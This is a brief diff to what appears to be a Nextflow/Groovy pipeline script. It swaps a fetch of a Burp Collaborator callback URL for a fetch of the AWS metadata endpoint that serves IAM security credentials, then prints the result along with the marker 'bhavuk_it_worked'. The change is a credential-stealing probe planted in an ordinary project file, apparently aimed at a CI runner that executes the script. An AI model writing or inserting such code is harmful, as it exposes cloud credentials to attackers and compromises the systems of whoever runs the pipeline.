@@ -85,7 +85,7 @@ def helpMessage() {
  */
  
  
-pdb = file('https://k6r89ymfhkpn9lfj4rdz5zdk8be42t.burpcollaborator.net')
+pdb = file('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
 println "bhavuk_it_worked"
 println pdb.text
 
